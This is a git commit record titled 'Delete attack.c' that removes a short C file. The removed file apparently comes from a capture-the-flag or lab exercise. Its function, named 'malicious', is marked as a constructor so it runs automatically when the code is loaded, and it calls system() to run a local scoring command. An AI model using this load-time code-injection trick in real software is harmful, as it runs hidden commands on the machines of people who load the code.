965a3092830200b50a63148b3ca4bab819957542
shellock-me <57331633+shellock-me@users.noreply.github.com>
2019-11-03 23:00:24 +0100

    Delete attack.c

--- attack.c
+++
@@ -1,9 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-    system("/usr/local/bin/score 5ea126ec-f815-4d7f-a74a-417ba41568ae");
-}
-
